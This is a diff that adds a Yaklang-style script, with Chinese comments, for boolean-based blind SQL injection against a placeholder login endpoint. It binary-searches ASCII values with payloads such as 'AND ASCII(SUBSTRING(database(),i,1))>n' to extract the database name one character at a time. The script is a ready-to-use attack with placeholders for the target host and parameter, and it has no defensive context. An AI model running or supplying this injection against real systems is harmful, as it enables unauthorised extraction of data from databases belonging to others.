@@ -1,3 +1,65 @@
-poc.GEt("http://www.baidu.com")
-poc.post("www.baidu.com")
-a,err = fuzz.HTTPRequest('')
+// 目标URL和基础参数设置
+var targetHost = "example.com" // 替换为目标域名
+var targetPath = "/login"      // 替换为注入点路径
+var baseParam = "id=1"         // 基础参数（注入点参数）
+
+// 验证基础请求是否成功
+rsp, _ = poc.HTTP(`GET ${targetPath}?${baseParam} HTTP/1.1
+Host: ${targetHost}
+Connection: close`)~
+if !rsp.Contains("success") {
+    die("基础请求未返回预期响应，可能无法注入！")
+}
+
+// 定义二分法猜解参数
+var low = 32      // ASCII起始范围（空格）
+var high = 126    // ASCII结束范围（~符号）
+var mid = 0
+var resultChar = 0
+var payload = ""
+
+// 猜解数据库名的第一个字符ASCII码
+for low <= high {
+    mid = (low + high) / 2
+    payload = sprintf("%s AND ASCII(SUBSTRING(database(),1,1))>%d", baseParam, mid)
+    
+    // 构造带注入的HTTP请求
+    reqStr = `GET ${targetPath}?${payload} HTTP/1.1
+Host: ${targetHost}
+Connection: close`
+    
+    // 发送请求并分析响应
+    rsp, _ = poc.HTTP(reqStr)~
+    if rsp.Contains("success") {
+        low = mid + 1
+    } else {
+        high = mid - 1
+    }
+}
+
+// 输出结果
+resultChar = low
+println("第一个字符ASCII码:", resultChar)
+println("对应字符:", string(resultChar))
+
+// 扩展功能：循环猜解所有字符（示例）
+for i in 1..10 { // 猜解前10个字符
+    var charCode = 0
+    low = 32
+    high = 126
+    for low <= high {
+        mid = (low + high) / 2
+        payload = sprintf("%s AND ASCII(SUBSTRING(database(),%d,1))>%d", baseParam, i, mid)
+        reqStr = `GET ${targetPath}?${payload} HTTP/1.1
+Host: ${targetHost}
+Connection: close`
+        rsp, _ = poc.HTTP(reqStr)~
+        if rsp.Contains("success") {
+            low = mid + 1
+        } else {
+            high = mid - 1
+        }
+    }
+    charCode = low
+    print(string(charCode))
+}
